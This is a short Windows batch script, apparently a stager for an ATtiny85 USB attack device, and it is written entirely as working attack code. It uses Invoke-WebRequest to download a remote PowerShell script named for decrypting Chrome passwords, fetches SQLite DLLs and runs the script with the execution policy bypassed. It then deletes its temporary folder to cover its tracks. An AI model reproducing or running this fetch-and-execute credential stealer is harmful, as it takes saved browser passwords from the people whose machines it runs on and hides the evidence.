@echo off
:: Step 1: Create a temporary directory
set tempDir=%temp%\attiny_package
if not exist %tempDir% mkdir %tempDir%

:: Step 2: Download PowerShell script
echo Downloading decrypt_chrome_passwords.ps1...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/Decrypt%20Chrome%20Passwords/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"

:: Step 3: Download SQLite DLL files
echo Downloading SQLite DLL files...
powershell -Command "Invoke-WebRequest -Uri 'https://www.sqlite.org/2022/sqlite-dll-win64-x64-3390200.zip' -OutFile '%tempDir%\sqlite.zip'"

:: Step 4: Extract SQLite DLL files
echo Extracting SQLite DLL files...
powershell -Command "Expand-Archive -Path '%tempDir%\sqlite.zip' -DestinationPath '%tempDir%\sqlite' -Force"

:: Step 5: Update PATH to include SQLite DLLs
set PATH=%tempDir%\sqlite;%PATH%

:: Step 6: Execute the PowerShell script
echo Executing PowerShell script...
powershell -ExecutionPolicy Bypass -File "%tempDir%\decrypt_chrome_passwords.ps1"

:: Step 7: Cleanup temporary files
echo Cleaning up temporary files...
cd /d %temp%
rd /s /q %tempDir%

:: Step 8: Exit
echo Script execution completed.
exit
